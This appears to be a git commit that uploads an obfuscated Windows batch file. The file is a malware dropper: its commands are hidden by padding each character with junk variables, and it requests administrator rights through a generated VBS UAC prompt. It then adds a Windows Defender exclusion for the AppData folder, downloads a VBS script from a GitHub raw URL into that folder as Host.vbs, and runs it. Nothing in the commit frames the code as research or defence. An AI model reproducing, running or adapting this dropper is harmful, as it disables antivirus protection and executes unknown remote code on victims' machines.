a8209070baa5c426483108151cf2ee0006a88fb7
Violentqm <79298794+violentqm@users.noreply.github.com>
2023-11-02 06:58:11 -0700

    Add files via upload

---
+++ v2obfusc.bat
@@ -0,0 +1,91 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF65
+::ZR41oxFsdFKZSTk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpSI=
+::egkzugNsPRvcWATEpSI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFBxCSQqFADieRpoe4u34+/m7kGwpZ94xfZjn7bucLfMvxG+pQpk/20ZOndgYQh5Ae3I=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+::VIOLOL
+@%cQ%e%DPfBRs%c%eOsLWiPuB%h%YiISoDXR%o%jRN% %YtK%o%ynp%f%DSXwgVbn%f%OKsmKII%
+
+R%AMXxMyrO%E%radjsSMBI%M%WrOcQQ% %OaZPlBh% %BXu%-%RNSqlm%-%yiVGG%>%MoreeZf% %aFT%C%CmeguNjuxT%h%JTkfuVGM%e%Cp%c%Xm%k%ShhMwnAIB% %gOluDgdpB%f%BSP%o%bqOQSfUoD%r%hzxB% %vsNHzGUaIB%p%vodU%e%TkBaKmkq%r%EEd%m%fnkGnwHiBX%i%TvuLvLBNnA%s%QyeqHQyDna%s%cnR%i%AipiXFNcU%o%qVckVQL%n%PoENwEKlFO%s%MqVeBEDi%
+ %rKNWoWfyiu% %WyReO% %VHo% %rswopniU%I%HxTUkQ%F%LQyp% %dXBe%"%dSMeYmCd%%PROCESSOR_ARCHITECTURE%"%SvXXahvJTl% %iM%E%EEIQmjr%Q%XkEWmRbVh%U%ebYFd% %nFXfloqWo%"%hlgIucEMzv%a%AHakQxjW%m%XSnnJdl%d%CJmPhLtuO%6%H%4%oRs%"%yxngcLAg% %Tg%(%KYNCc%
+>%VhlwxvOcml%n%Hjll%u%brZzDL%l%XkHPExQone% %BICAWXty%2%j%>%LXoYhj%&%ZWlsz%1%IwMpkVxDuT% %FObBrxvLwu%"%IHQy%%SYSTEMROOT%\%niUu%S%CiFET%y%d%s%DHZmwAaA%W%i%O%x%W%lQqJQBPIRm%6%jkKPwOSJ%4%uMVasRwl%\%eopqWsLFH%c%wBmQtyHk%a%FfqdsL%c%wbsHr%l%Jy%s%xWDtF%.%ye%e%RteCbM%x%KcHaYvRF%e%hnkB%"%XQIaJSHEt% %I%"%AenyDVGgp%%SYSTEMROOT%\%SaJ%S%RXDdEXfab%y%Jo%s%mQWfdyqVGW%W%wzImGL%O%LiMhJFaQ%W%pk%6%gmf%4%BCmLvd%\%XqMJUbeQav%c%IkCgL%o%egDuu%n%WgeFGqw%f%VGPhDDkQe%i%XbpzffN%g%hahlRM%\%hcws%s%fwdugj%y%YjQZshlzi%s%sr%t%yuaPluD%e%HlHYWnI%m%gjBgLQElou%"%RisgcznQ%
+)%zrDMArw% %UPqlMJCbXl%E%MMwfgVunc%L%FFXf%S%cVACe%E%HGKhcrIZwA% %KbRphEXv%(%ERlMS%
+>%UAWMiTRoO%n%QhZybdAn%u%fAnv%l%C% %apHaX%2%P%>%MmVXV%&%QFB%1%b% %rLmDIH%"%VsYigpNYIT%%SYSTEMROOT%\%z%s%YhZS%y%olLNDGhIvH%s%CpZKOkY%t%xkGy%e%ePM%m%MpLUyKYOFb%3%RDudpIYp%2%AaTIspOGGW%\%BqjQbjC%c%SKnFPs%a%v%c%DkFuxLDMI%l%xxSGivlV%s%uO%.%FHOTyp%e%R%x%sv%e%kJlobpZkZM%"%COoNXT% %wsujVIP%"%JcU%%SYSTEMROOT%\%IaUO%s%J%y%HJGHHMX%s%HDTUen%t%iHf%e%UogZEAHqHK%m%HVHotC%3%zR%2%SaBLd%\%IIQ%c%JmoUkzVo%o%UiJJyALUdp%n%XOpP%f%wrys%i%RVe%g%WC%\%sr%s%ZUyVn%y%mcbFg%s%F%t%gqXVHnod%e%zzCsk%m%fwsXHRrk%"%AQFrJ%
+)%HemjnwgTn%
+
+R%eN%E%TVZSlwUDtf%M%o% %KgjsgxtKS%-%NZW%-%Jfy%>%UtLKiuFf% %qHRJqOhskQ%I%wUFM%f%zogVogFTzZ% %yuvqAIDuhN%e%xBU%r%neKDOw%r%BMfV%o%FFywCo%r%lIllJT% %YmbGwG%f%IOydi%l%KUW%a%mDdOIkkp%g%dCpEm% %GrBNkHdPL%s%kxA%e%ORiROzoSC%t%DeCR%,%WImJnQ% %dYxaHLG%w%iQgmguZcDh%e%n% %SYikJejiy%d%kY%o%ZYLLtSnwPM% %cnx%n%fYnvzf%o%f%t%oLaAZ% %eOa%h%mQqUnBJFAX%a%WXBOjRRarW%v%CXU%e%tl% %IwxWjH%a%svWqXU%d%jjdT%m%hpya%i%s%n%yaxWzX%.%YoskUYOFx%
+i%TdUg%f%sAGDMmH% %LpQnH%'%z%%errorlevel%'%FFAQtd% %fVYmwg%N%xKuSFiNM%E%YorAf%Q%KsAQ% %FLQzPRos%'%SELAd%0%VbnhiyLA%'%xHD% %cmLmQtrKd%(%CUlS%
+ %Q% %Kuw% %nSatH% %OueaZvejd%e%GksMY%c%yiRbbcgZO%h%HYWcj%o%PPuuacZFHq% %D%R%zbzJM%e%RGaM%q%ig%u%OIcV%e%dp%s%OKdNzeflQ%t%dMrXfoItcP%i%jsGLeyayn%n%cR%g%tcHpAIHEOV% %N%a%nNp%d%gJspkRGr%m%at%i%FmkyDkbjUf%n%vQBp%i%ysFJdtVYuH%s%C%t%aYlStnh%r%oVwGIGHSX%a%dBORkju%t%JlIgBeppQJ%i%nB%v%tcHDlLdoef%e%Vkeay% %MOaVw%p%ESYoOH%r%oPeB%i%ASiZ%v%K%i%Q%l%zaP%e%GVhJce%g%BR%e%HRLQFBE%s%wRWCqBH%.%Zc%.%VND%.%ioMmSJ%
+ %PWJgQOYCa% %xtBXqPSV% %AzNMHQ% %SlTxIl%g%DcBfdjb%o%IzyNXdJjf%t%fGVmhdv%o%x% %Tw%U%XhVX%A%BUIVY%C%EsKHqaHzh%P%wljot%r%VxRjxkfvp%o%qDDqM%m%ZV%p%XYSHMwoeET%t%QacUWae%
+)%o% %LTcNARC%e%kUMB%l%wTseZA%s%ulsLWB%e%WIZwDerk% %WvltMMYQ%(%NMNAuXFcb% %PSCBbPZjX%g%glQxwfcszj%o%zYS%t%y%o%xji% %eOiAEIbH%g%IXLZ%o%YWu%t%oht%A%DTXIRSB%d%MTAMUJ%m%QG%i%GLtjmhOt%n%mIaxsaBNt% %OoIsFHj%)%KMbPNM%
+
+:UACPrompt
+:%ewsaGkfe%U%DGS%A%mLEUcWLUQ%C%rEHQAcXxEH%P%kUcFEefy%r%LszDDqSH%o%SCV%m%aqwwfgAKR%p%WKvtQsqwKG%t%nqqKlyGCb%
+ %TcDab% %YZTv% %FwIvWSSn% %uuYQE%e%dDWnIft%c%BZHmW%h%WdY%o%UxyARr% %ydoCKKf%S%bentuC%e%i%t%DVVtYbNDey% %eiAWBkOzVc%U%zHptiiYkk%A%KgC%C%FLcv% %b%=%LLDOJk% %oEPBE%C%pMgqX%r%sTBNOgiN%e%kzZsJNSl%a%BPDyDFnf%t%qFhHLtgZT%e%klU%O%Skvjyhl%b%SpVdokDb%j%o%e%TWDuae%c%OnGcT%t%SdHdZ%^%ETpisKVhG%(%XKyyZc%"%ZHmH%S%NwN%h%webDMMltg%e%HebJ%l%Rkf%l%ZLEimHDp%.%PqCeR%A%g%p%uRjbyP%p%gWcZ%l%hol%i%O%c%TqrKbSi%a%YOQFyGDmPJ%t%UXMtVa%i%qya%o%fh%n%dVmArtX%"%QAsYJyMQnx%^%oyw%)%NLlGEMer% %XyMbZb%>%TXPEv% %rJdqlTR%"%oTx%%temp%\%AGxyvtbtK%g%FxH%e%ZydCMPQSp%t%diOHMuMC%a%aFIGMIQRKT%d%w%m%fapoA%i%AppQPAUTbO%n%TFQqizF%.%pUUUpsko%v%zf%b%vU%s%IaniEJVxC%"%kQUNuxeZ%
+ %MMtVxCXw% %qhgNooh% %ew% %N%s%qERxSgtLCg%e%j%t%WtUDhQeo% %NYjxYUI%p%RJfbgxCu%a%IbqEkCCG%r%jwID%a%QwnOrjdIJ%m%a%s%zi%=%Gj% %GroqUf%%*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~%Uc%s%Z%0%pPCoImfu%"%l%"%kJiLQI% %YoUnO%%params:"=""%"%SrwqbC%,%yVaQctfsZm% %yqg%"%U%"%U%,%dZ% %FFM%"%HVjR%r%MjCnNgeLb%u%eJz%n%ttQ%a%cvccA%s%WhTTZLhS%"%T%,%wBXsAU% %dTGOEqYlbO%1%uX% %JKRWqwSgIJ%>%pSoCLOKe%>%DPqLFOlCco% %kjXIABI%"%CSDkN%%temp%\%sLMz%g%JHYizgmzAo%e%nnBMRgEh%t%Su%a%nDT%d%C%m%IHGTAY%i%w%n%k%.%swVCVMUc%v%ozwSzz%b%NEoWgWS%s%sPXgJccaC%"%SGlrxwif%
+
+ %qrjrfg% %FjbNGqaCqP% %SpgCVWl% %zndTfBy%"%ls%%temp%\%NYBrKSf%g%NwsKJY%e%wbOVEq%t%DMmGnhJKio%a%Ys%d%zhADsWIPSp%m%ptTU%i%KAnIMQD%n%hMhzwFlkWx%.%miMEwH%v%LontitW%b%kcWxMx%s%plFm%"%dSmsAkbfl%
+ %oBFK% %SQtdzLR% %pXTjNMt% %ws%d%fjF%e%i%l%iUGaatOiY% %NyhGsQhlaV%"%qvouvXJ%%temp%\%Upzu%g%HQMQteV%e%SCuJRdyPUz%t%C%a%Aqcq%d%MQnigjGn%m%diyuBhYb%i%Br%n%kqNfgS%.%iXreyKmPOE%v%qfWZB%b%WXhREU%s%FCWmAsoYox%"%Dqcq%
+ %brOSkttNc% %MQa% %rw% %bTx%e%WIENGqdcy%x%K%i%AEse%t%rMPigGcJ% %qhhxHRLOT%/%CGvomhhvZI%B%Nra%
+
+:gotAdmin
+:%STMyev%g%liuXhS%o%AxiFClv%t%IEZoEjn%A%J%d%scE%m%ANHcs%i%rsFERuV%n%YszWvX%
+ %r% %zzDOMYlTzi% %utOj% %worrQzT%p%MSHDkLdpbo%u%vwAtsONFXM%s%BBcoa%h%OURltLn%d%l% %TsjwcZ%"%amkdTPdy%%CD%"%VOaAdyNAm%
+ %grcQkMC% %xudP% %E% %klndL%C%JV%D%Xi% %PPSdFST%/%AFKxXHE%D%fmtLTnZdN% %WDBlF%"%CwVt%%~dp0"
+
+setlocal enabledelayedexpansion
+
+set "exclusionPath=%A%e%P%w%P%ahcIO%D%TE%A%oWx%T%LuhzshfK%A%Z%%"
+set "url=https://raw.githubusercontent.com/violentqm/rest/main/sussyyyyls.vbs"
+set "url=https://raw.githubusercontent.com/violentqm/rest/main/sussyyyyls.vbs"
+set "outputFile=%A%wg%P%NhQBTTkNY%P%qfEnZDf%D%awLraCIl%A%qMime%T%TlAKJ%A%riZTv%%\Host.vbs"
+
+powershell -command "$antivirusEnabled = (Get-MpComputerStatus).AntivirusEnabled; if (-not $antivirusEnabled) { echo Antivirus is not enabled. } else { Add-MpPreference -ExclusionPath '%e%LVc%x%T%c%zcuVy%l%QvAcRuNY%u%NDvMUz%s%BAympVZGhv%i%r%o%myhmeN%n%UIu%P%pPGaISNRlX%a%crIxat%t%GgFCob%h%cVvnvb%%' }"
+
+if %e%e%r%h%r%izLbDdw%o%OVtYwPUuH%r%V%l%ObNu%e%LxYqoq%v%VVENTkMrUc%e%bqe%l%ygiVIWIa%% neq 0 (
+    echo Failed to set exclusion path or antivirus is not enabled.
+    exit /b 1
+)
+
+timeout /t 3 /nobreak > NUL
+
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%u%Re%r%rhutAyvQ%l%uXtqixNNTL%%', '%o%lTG%u%CcLW%t%UyFHo%p%kRzf%u%vbPqLrBEr%t%EZ%F%DrVYUNpn%i%WpOtfZsL%l%e%e%zR%%')"
+
+if not exist "%o%ffVoPbfxoE%u%LzCROJYZIk%t%LTjCnu%p%vLN%u%fbJPBP%t%nXENgelMy%F%ThT%i%PQAxQo%l%cBMvqfSqg%e%mGobLTNY%%" (
+    echo Failed to download WSF data.
+    exit /b 1
+)
+
+start "" "%o%KOIFXfeeRy%u%MtYMB%t%ktjTfcRrwd%p%Ujt%u%J%t%zWekoFPI%F%U%i%wnRRhOI%l%Aw%e%odSF%%"
+
+endlocal
